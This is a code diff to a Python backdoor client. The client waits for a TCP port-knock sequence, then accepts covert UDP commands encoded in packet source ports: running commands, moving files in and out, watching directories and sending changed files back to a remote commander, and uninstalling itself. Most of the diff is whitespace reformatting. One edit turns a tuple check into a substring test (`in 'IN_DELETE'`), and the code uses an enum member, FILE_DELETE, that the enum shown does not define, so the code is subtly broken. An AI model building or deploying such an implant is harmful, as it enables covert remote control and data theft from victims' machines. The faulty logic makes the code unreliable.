@@ -20,22 +20,22 @@ from file_watcher import FileWatcher
 
 # Configuration
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
-KNOCK_TIMEOUT  = 10                   # Seconds to complete knock sequence
-COMMAND_PORT   = 8888                 # UDP port for covert channel
-TMP_DIR        = "client_files/"     # Directory for files transferred from commander
+KNOCK_TIMEOUT = 10  # Seconds to complete knock sequence
+COMMAND_PORT = 8888  # UDP port for covert channel
+TMP_DIR = "client_files/"  # Directory for files transferred from commander
 
 
 class CommandType(IntEnum):
     """Commands encoded in UDP src-port field"""
-    DISCONNECT           = 0x1234
-    UNINSTALL            = 0x2345
-    TRANSFER_TO_CLIENT   = 0x3456
+    DISCONNECT = 0x1234
+    UNINSTALL = 0x2345
+    TRANSFER_TO_CLIENT = 0x3456
     TRANSFER_FROM_CLIENT = 0x4567
-    RUN_COMMAND          = 0x5678
+    RUN_COMMAND = 0x5678
     FILE_WATCH = 0x6789
     STOP_WATCH = 0x8901
-    ACK                  = 0x9ABC
-    ERROR                = 0xABCD
+    ACK = 0x9ABC
+    ERROR = 0xABCD
 
 
 class Client:
@@ -46,15 +46,15 @@ class Client:
     """
 
     def __init__(self):
-        self.knock_ports     = KNOCK_SEQUENCE
-        self.command_port    = COMMAND_PORT
-        self.knock_sequence  = KNOCK_SEQUENCE
-        self.knock_timeout   = KNOCK_TIMEOUT
-        self.knock_attempts  = {}
-        self.authorized_ips  = set()
-        self.lock            = threading.Lock()
-        self.running         = True
-        self.protocol        = RawSocketProtocol()
+        self.knock_ports = KNOCK_SEQUENCE
+        self.command_port = COMMAND_PORT
+        self.knock_sequence = KNOCK_SEQUENCE
+        self.knock_timeout = KNOCK_TIMEOUT
+        self.knock_attempts = {}
+        self.authorized_ips = set()
+        self.lock = threading.Lock()
+        self.running = True
+        self.protocol = RawSocketProtocol()
         self._watcher_thread = None  # active watcher thread
         self._watcher_stop = threading.Event()  # set to stop the watcher
 
@@ -142,10 +142,10 @@ class Client:
     def _reset_transfer_state(self):
         """Return a clean slate for a new inbound transfer."""
         return {
-            'chunks':        {},
+            'chunks': {},
             'expected_total': None,
             'current_command': None,
-            'current_src_ip':  None,
+            'current_src_ip': None,
         }
 
     def listen_for_covert_commands(self):
@@ -176,9 +176,9 @@ class Client:
                         print(f"[!] Unauthorized covert packet from {src_ip} — ignoring")
                         continue
 
-                    seq          = parsed["seq"]
-                    data         = parsed["data"]
-                    total        = parsed["total"]
+                    seq = parsed["seq"]
+                    data = parsed["data"]
+                    total = parsed["total"]
                     command_code = parsed["command"]
 
                     # ── Reset if a new sender interrupts an in-progress transfer ──
@@ -189,10 +189,10 @@ class Client:
 
                     # ── Initialise state on first packet of a new command ─────────
                     if state['expected_total'] is None:
-                        state['expected_total']   = total
-                        state['current_command']  = command_code
-                        state['current_src_ip']   = src_ip
-                        state['chunks']           = {}
+                        state['expected_total'] = total
+                        state['current_command'] = command_code
+                        state['current_src_ip'] = src_ip
+                        state['chunks'] = {}
                         print(f"\n[+] Receiving covert command from {src_ip}")
                         print(f"    Expected packets: {total}")
 
@@ -295,8 +295,8 @@ class Client:
             print("[*] Processing TRANSFER_TO_CLIENT")
             try:
                 filename_length = struct.unpack('!H', payload[:2])[0]
-                filename        = payload[2:2 + filename_length].decode('utf-8')
-                filedata        = payload[2 + filename_length:]
+                filename = payload[2:2 + filename_length].decode('utf-8')
+                filedata = payload[2 + filename_length:]
 
                 print(f"    Receiving file: {filename} ({len(filedata)} bytes)")
 
@@ -346,6 +346,7 @@ class Client:
             try:
                 self._stop_file_watcher()
                 watcher = FileWatcher(path=filepath, recursive=True)
+
                 def run_watcher():
                     import inotify.adapters
                     try:
@@ -380,7 +381,7 @@ class Client:
                                         print(f"[!] Watcher: could not send '{filename}': {e}")
 
 
-                                elif event_name in ('IN_DELETE', 'IN_MOVED_FROM', 'IN_DELETE_SELF'):
+                                elif event_name in 'IN_DELETE':
                                     self.send_response(src_ip, CommandType.FILE_DELETE, filename.encode('utf-8'))
                                     print(f"[*] Watcher: notified deletion of '{filename}'")
 
